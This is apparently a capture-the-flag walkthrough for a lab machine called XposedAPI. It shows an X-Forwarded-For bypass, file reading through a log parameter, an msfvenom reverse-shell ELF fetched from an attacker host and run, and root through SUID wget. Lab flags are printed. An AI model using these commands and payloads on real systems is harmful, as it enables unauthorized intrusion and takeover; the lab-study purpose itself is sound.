@@ -1,0 +1,142 @@
+																							                     XposedAPI Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.209.134
+export IP=192.168.209.134
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp    open  ssh
+13337/tcp open  unknown
+
+nmap -Pn -n -sC -sV -p22,13337 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+13337/tcp open  http    Gunicorn 20.0.4
+|_http-title: Remote Software Management API
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+# Accessing the API at port 13337, we get the message 
+   Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.
+   
+# When we try to see if we can upload a malicious payload, the server requires a valid username. So most likely we need another weak point from where we can gather a valid username.
+   When we try to access the logs section we notice that the WAF Stop us, most likely since it allowes only local request. Let's add a new header X-Forwarded-For to see if can bypass the restriction.
+   
+GET /logs HTTP/1.1
+Host: 192.168.209.134:13337
+Content-Length: 0
+X-Forwarded-for: 127.0.0.1
+
+
+HTTP/1.1 404 NOT FOUND
+Server: gunicorn/20.0.4
+
+Error! No file specified. Use file=/path/to/log/file to access log files.
+
+# So, we need to find the correct path to the logs. After reaching online, we coudn't find a proper path to access logs.
+   May we can use HTTP parameter fuzzing to see if we can access other sensitive files within the app?
+   
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  --hc 404 --hh 27 -H "X-Forwarded-For: 127.0.0.1" "http://$IP:13337/logs?FUZZ=/etc/passwd" 
+
+200        45 L     96 W       2046 Ch     "file" 
+
+# Since we found the file parameter, let's see if we get anything going!
+   
+GET /logs?file=/etc/passwd HTTP/1.1
+Host: 192.168.209.134:13337
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Length: 0
+X-Forwarded-for: 127.0.0.1
+
+
+root:x:0:0:root:/root:/bin/bash
+....................................................
+clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
+
+
+# Now that we have an active user, let's try to upload an elf file containing a reverse shell.
+
+/update
+Methods: POST
+Updates the app from ELF file. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}
+
+# Creating the payload using msfvenom
+
+msfvenom -p linux/x86/shell_reverse_tcp -f elf -o shell LHOST=192.168.45.5 LPORT=13337
+
+# Let's upload the shell using the available POST method on the update endpoint.
+
+POST /update HTTP/1.1
+Host: 192.168.209.134:13337
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Type: application/json
+Content-Length: 62
+
+{
+"user":"clumsyadmin",
+"url":"http://192.168.45.5/shell"
+}
+
+# You can use curl if you want as well
+
+curl -X POST http://$IP:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.45.5/shell"}'
+
+
+# Since we cannot access the uploaded file directory, we can try to restart the API using the available endpoint.  Nothing happends if you don't have a listener opened, so have a netcat listener opened and try to restart the API.
+
+/restart
+Methods: GET
+To request the restart of the app.
+
+Use the URL in browser while having nc listener:
+
+nc -lvnp 13337
+
+http://192.168.209.134:13337/restart
+
+listening on [any] 13337 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.209.134] 51554                                   # Got shell
+
+cat /home/clumsyadmin/local.txt                                                                                    # Flag: 2d8a11f88433ab0dce2e1ad12ca5f9c9
+
+
+Privilege escalation
+
+# Checking the SUID
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/bin/wget
+
+# Gtfobins the sucker
+
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
+/usr/bin/wget --use-askpass=$TF 0
+
+#whoami
+root
+cat /root/proof.txt                                                                                                           # Flag: c313feb256438e17c393f7a2020d4306
+
+
+# Or you can just overwrite files such as /etc/passwd on the machine is SUID is set on wget.  Create a passwd file and overwrite the /etc/passwd file on the machine using wget. 
+
+wget http://192.168.118.5/passwd -O /etc/passwd
